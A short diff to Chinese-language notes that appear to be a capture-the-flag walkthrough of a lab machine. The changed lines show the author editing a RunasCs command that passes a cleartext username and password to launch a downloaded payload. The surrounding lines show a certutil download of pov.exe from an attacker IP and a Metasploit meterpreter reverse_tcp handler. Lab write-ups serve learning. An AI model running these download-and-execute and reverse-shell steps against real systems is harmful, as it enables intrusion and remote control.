@@ -916,7 +916,9 @@ certutil -urlcache -f http://10.10.16.26:8000/pov.exe pov.exe
 
 开一个msfconsole,在multi/handler模块,使用`set payload window/x64/meterpreter/reverse_tcp`模块
 
-`.\RunasCs.exe alaading f8gQ8fynP44ek1m3 "C:\\Users\\alaading\\pov.exe"`
+`.\RunasCs.exe alaading f8gQ8fynP44ek1m3 "pov.exe"`
+.\rc.exe alaading f8gQ8fynP44ek1m3 "pov.exe"
+
 卡在sending stage了....,应该是因为vpn在window上
 
 ### Manager
